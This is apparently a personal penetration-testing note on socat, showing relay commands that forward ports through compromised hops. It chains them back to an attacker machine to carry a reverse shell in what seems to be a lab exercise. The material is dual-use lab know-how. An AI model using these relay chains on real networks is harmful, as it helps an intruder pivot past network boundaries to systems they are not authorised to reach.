---
type: tool
category: tunneling
related: [[pivoting]], [[port-forwarding]], [[chisel]]
---

# Socat

Multipurpose relay: bidirectionally forwards data between two addresses. In pivoting it's the glue when a hop can't reach the attacker directly.

## Relay a listener through a hop

```sh
./socat tcp-l:333,fork,reuseaddr tcp:10.10.10.1:33
```

Listens on `:333` here and passes every connection to `10.10.10.1:33`. `fork` handles multiple connections, `reuseaddr` lets you restart without `TIME_WAIT` errors.

## Build a reverse path hop by hop

Set up relays **in reverse order** (farthest hop first) so a target's outbound connection walks back to the attacker:

```sh
# on trust:   4444 → inclusion
./socat tcp-l:4444,fork,reuseaddr tcp:20.20.20.2:4443
# on inclusion: 4443 → kali
./socat tcp-l:4443,fork,reuseaddr tcp:10.10.10.1:443
```

Each machine only needs a route to its *neighbor* — the chain does the rest ([[pivoting]]).

## Seen in

[[littlepivoting]] (manual re-run: relayed the chisel server port through `inclusion`, then chained `trust → inclusion → Kali` for the reverse shell).
